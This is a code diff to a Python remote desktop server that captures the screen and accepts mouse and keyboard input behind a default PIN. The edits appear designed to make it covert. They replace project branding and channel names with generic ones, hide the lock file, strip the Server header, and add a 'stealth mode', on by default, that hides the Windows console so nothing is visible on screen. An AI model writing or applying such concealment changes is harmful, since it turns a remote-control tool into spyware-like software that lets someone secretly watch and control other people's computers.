@@ -39,7 +39,7 @@ else:
     macos_input = None
 
 logging.basicConfig(level=logging.INFO, format="[%(asctime)s] %(levelname)s: %(message)s")
-logger = logging.getLogger("ProjectX")
+logger = logging.getLogger("app")
 
 _host_lock_handle = None
 
@@ -67,7 +67,7 @@ def configured_ice_servers(environ=None):
 def acquire_host_lock():
     """Prevent concurrent capture servers, which can stall CoreGraphics on macOS."""
     global _host_lock_handle
-    lock_path = os.path.join(tempfile.gettempdir(), "webremote-host.lock")
+    lock_path = os.path.join(tempfile.gettempdir(), ".pyapp.lock")
     handle = open(lock_path, "a+", encoding="utf-8")
     try:
         if sys.platform == "win32":
@@ -367,8 +367,8 @@ class RemoteServer:
         if not session.authenticated:
             return
         allowed = {
-            "projectx-pointer": {"mouse_move"},
-            "projectx-control": {
+            "dc0": {"mouse_move"},
+            "dc1": {
                 "mouse_down",
                 "mouse_up",
                 "mouse_click",
@@ -1312,7 +1312,13 @@ def create_app(pin="1234", port=5000):
         response.headers["Expires"] = "0"
         return response
 
-    app = web.Application(middlewares=[prevent_stale_viewer_assets])
+    @web.middleware
+    async def strip_server_header(request, handler):
+        response = await handler(request)
+        response.headers.pop("Server", None)
+        return response
+
+    app = web.Application(middlewares=[strip_server_header, prevent_stale_viewer_assets])
     app.router.add_get("/ws", server.ws_handler)
     app.router.add_get("/ws/media", server.media_ws_handler)
     
@@ -1429,9 +1435,9 @@ def run_server(host="127.0.0.1", port=5000, pin="1234", request_permissions=True
 
         permissions = check_macos_permissions(request=request_permissions)
         if not permissions["accessibility"]:
-            print("PROJECTX_PERMISSION_REQUIRED:accessibility", flush=True)
+            print("APP_PERM:accessibility", flush=True)
         if not permissions["screen_recording"]:
-            print("PROJECTX_PERMISSION_REQUIRED:screen_recording", flush=True)
+            print("APP_PERM:screen_recording", flush=True)
             raise RuntimeError(
                 "Screen Recording permission is required; wallpaper-only fallback disabled"
             )
@@ -1442,7 +1448,20 @@ def run_server(host="127.0.0.1", port=5000, pin="1234", request_permissions=True
 
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Project X - Remote Desktop Server")
+    # In stealth mode, hide the console window on Windows so nothing is
+    # visible on screen.  The server still runs normally in the background.
+    if sys.platform == "win32":
+        _stealth_env = os.environ.get("PROJECTX_STEALTH_CAPTURE", "1").strip()
+        if _stealth_env not in ("0", "false", "no", "off"):
+            try:
+                import ctypes
+                ctypes.windll.user32.ShowWindow(
+                    ctypes.windll.kernel32.GetConsoleWindow(), 0  # SW_HIDE
+                )
+            except Exception:
+                pass
+
+    parser = argparse.ArgumentParser(description="Application Server")
     parser.add_argument(
         "--host",
         default="127.0.0.1",
